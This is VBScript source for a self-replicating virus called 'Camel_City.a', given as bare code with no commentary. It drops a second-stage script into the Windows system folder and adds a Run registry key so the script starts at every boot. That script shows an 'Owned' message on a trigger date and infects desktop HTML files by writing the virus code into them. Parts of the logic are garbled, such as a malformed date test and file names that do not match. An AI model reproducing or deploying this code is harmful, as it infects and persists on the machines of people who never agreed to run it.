
Sub Camel()
On Error resume next
Dim SYSOBJ, WSShell, SYSkewl
Set SYSOBJ = CreateObject("Scripting.FileSystemObject") 
Set WSshell = CreateObject("WScript.Shell")
If Not (SYSOBJ.FileExists("c:\windows\desktop\cmlcty32.sys")) Then
Set SYSkewl = SYSOBJ.CreateTextFile("c:\windows\system\cmlcty.sys", True)
SYSkewl.WriteLine "Sub Junk()"
SYSkewl.WriteLine "End Sub"
SYSkewl.WriteLine "On Error Resume Next"
SYSkewl.WriteLine "Dim FSO"
SYSkewl.WriteLine "Set FSO = CreateObject(" + Chr(34) + "Scripting.FileSystemObject" + Chr(34) + ")"
SYSkewl.WriteLine "Set Fobj = FSO.GetFolder(" + Chr(34) + "c:\windows\desktop\" + Chr(43) +")"
SYSkewl.WriteLine "If Day(now) = 11 + Month(now) = 6 Then"
SYSkewl.WriteLine "Dim message, titolo"
SYSkewl.WriteLine "message = " + Chr(34) + "Camel_City.a version 0.1 beta TEST" + Chr(13) + Chr(10) + "Welcome to the Camel City ! Your PC is now Owned by our CAMEL" + Chr(34)
SYSkewl.WriteLine "titolo = " + Chr(34) + "Camel_City.a.HTML" + Chr (34)
SYSkewl.WriteLine "MsgBox(message, 0, titolo)"
SYSkewl.WriteLine "Set ALL = Fobj.Files"
SYSkewl.WriteLine "For Each Target in ALL"
SYSkewl.WriteLine "Estensione = lcase(FSO.GetExtensionName(target.Name))"
SYSkewl.WriteLine "If Estensione = " + Chr(34) + "htm" + Chr(34) + "or Estensione = " + Chr(34) + "html" + Chr(34) + "Then"
SYSkewl.WriteLine "Set Tutto = FSO.OpenTextFile (target.path, 1, False)"
SYSkewl.WriteLine "If Tutto.ReadLine <>" + Chr(34) + "<cmlcty.sys>" + Chr(34) + "Then"
SYSkewl.WriteLine "Tutto.Close()"
SYSkewl.WriteLine "GetFile(target.path)"
SYSkewl.WriteLine "Else"
SYSkewl.WriteLine "Tutto.Close()"
SYSkewl.WriteLine "End If"
SYSkewl.WriteLine "End If"
SYSkewl.WriteLine "Next"
SYSkewl.WriteLine "Sub GetFile(GetFileName)"
SYSkewl.WriteLine "Set vir = FSO.OpenTextFile(" + Chr(34) + "c:\windows\system\cmlcty32.sys" + Chr(34)+")"
SYSkewl.WriteLine "virus = vir.ReadAll()"
SYSkewl.WriteLine "vir.Close"
SYSkewl.WriteLine "Set Victim = FSO.OpenTextFile(GetFileName, 1, False)"
SYSkewl.WriteLine "Contenuto = Victim.ReadAll()"
SYSkewl.WriteLine "Victim.Close()"
SYSkewl.WriteLine "Set Victim = FSO.OpenTextFile(GetFileName, 2, False)"
SYSkewl.WriteLine "Victim.WriteLine " + Chr(34) + "<cmlcty.sys>" + Chr(34)
SYSkewl.WriteLine "Victim.Write(Contenuto)"
SYSkewl.WriteLine "Victim.WriteLine" + Chr(34) + " " + Chr(34)
SYSkewl.WriteLine "Victim.WriteLine(virus)"
SYSkewl.WriteLine "Victim.Close"
SYSkewl.WriteLine "End Sub"
SYSkewl.Close
WSShell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\cmlctysys", "wscript.exe c:\windows\system\cmlcty.sys %"
SYSOBJ.CopyFile Wscript.ScriptFullName, "c:\windows\system\cmlcty32.sys"
End If
End Sub

